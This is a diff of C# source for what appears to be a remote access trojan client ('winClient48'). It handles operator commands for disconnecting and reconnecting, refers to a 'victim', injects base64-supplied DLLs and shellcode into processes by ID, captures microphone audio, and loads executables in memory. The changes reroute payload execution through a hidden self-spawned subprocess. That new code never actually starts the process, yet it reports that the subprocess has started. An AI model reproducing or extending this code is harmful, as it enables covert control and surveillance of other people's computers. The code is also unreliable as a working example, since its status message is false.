@@ -349,11 +349,11 @@ namespace winClient48
                             {
                                 if (dsp.Param == 0) //DISCONNECT
                                 {
-                                    Disconnect();
+                                    fnDisconnect();
                                 }
                                 else if (dsp.Param == 1) //RECONNECT (REFRESH KEY)
                                 {
-                                    Reconnect();
+                                    fnReconnect();
                                 }
                             }
                             else if (dsp.Command == 1) //KEY EXCHANGE
@@ -479,7 +479,18 @@ namespace winClient48
                         int para = header.para;
                         byte[] msg = dsp.GetMsg().msg;
 
-                        if (cmd == CMD_TLS && para == PARA_ACK)
+                        if (cmd == 0)
+                        {
+                            if (para == 0)
+                            {
+                                fnDisconnect();
+                            }
+                            else if (para == 1)
+                            {
+                                fnReconnect();
+                            }
+                        }
+                        else if (cmd == CMD_TLS && para == PARA_ACK)
                         {
                             //new Thread(() => SendInfo(victim)).Start();
                         }
@@ -556,11 +567,11 @@ namespace winClient48
                         {
                             if (dsp.Param == 0) //DISCONNECT
                             {
-                                Disconnect();
+                                fnDisconnect();
                             }
                             else if (dsp.Param == 1) //RECONNECT (REFRESH KEY)
                             {
-                                Reconnect();
+                                fnReconnect();
                             }
                         }
                         else if (dsp.Command == 1) //KEY EXCHANGE
@@ -2436,6 +2447,7 @@ namespace winClient48
                         int nMethod = int.Parse(cmd[3]);
                         string szDllFileName = cmd[4];
                         byte[] abDllBytes = Convert.FromBase64String(cmd[5]);
+                        
                         (int nCode, string szMsg) ret = (0, string.Empty);
 
                         switch (nMethod)
@@ -2484,6 +2496,7 @@ namespace winClient48
                         int nProcId = int.Parse(cmd[2]);
                         int nMethod = int.Parse(cmd[3]);
                         byte[] abShellcode = Convert.FromBase64String(cmd[4]);
+                        
                         (int nCode, string szMsg) ret = (0, string.Empty);
 
                         switch (nMethod)
@@ -2656,21 +2669,43 @@ namespace winClient48
                     byte[] abAssembly = Convert.FromBase64String(cmd[3]);
                     clsfnLoader loader = new clsfnLoader();
 
+                    (int nCode, string szMsg) ret = (0, string.Empty);
+
                     if (cmd[1] == "x64")
                     {
-                        var ret = loader.fnLoadPeIntoMemory(abAssembly);
-
-                        v.fnSendCommand(new string[]
+                        var psi = new ProcessStartInfo
                         {
-                            "fle",
-                            ret.nCode.ToString(),
-                            ret.szMsg,
-                        });
+                            FileName = Process.GetCurrentProcess().MainModule.FileName,
+                            Arguments = $"--x64 {cmd[3]}",
+                            UseShellExecute = false,
+                            RedirectStandardOutput = true,
+                            CreateNoWindow = true,
+                        };
+
+                        ret.nCode = 1;
+                        ret.szMsg = "Subprocess is started, please check.";
                     }
                     else if (cmd[1] == "cs")
                     {
-                        
+                        var psi = new ProcessStartInfo
+                        {
+                            FileName = Process.GetCurrentProcess().MainModule.FileName,
+                            Arguments = $"--cs {cmd[3]} {string.Join(" ", alpArgs)}",
+                            UseShellExecute = false,
+                            RedirectStandardOutput = true,
+                            CreateNoWindow = true,
+                        };
+
+                        ret.nCode = 1;
+                        ret.szMsg = "Subprocess is started, please check.";
                     }
+
+                    v.fnSendCommand(new string[]
+                    {
+                        "fle",
+                        ret.nCode.ToString(),
+                        ret.szMsg,
+                    });
                 }
 
                 #endregion
@@ -2954,7 +2989,7 @@ namespace winClient48
             if (funcMicAudio != null)
                 funcMicAudio = null;
         }
-        void Disconnect()
+        void fnDisconnect()
         {
             if (is_connected)
             {
@@ -2963,7 +2998,7 @@ namespace winClient48
                 Environment.Exit(0);
             }
         }
-        void Reconnect()
+        void fnReconnect()
         {
             if (is_connected)
             {
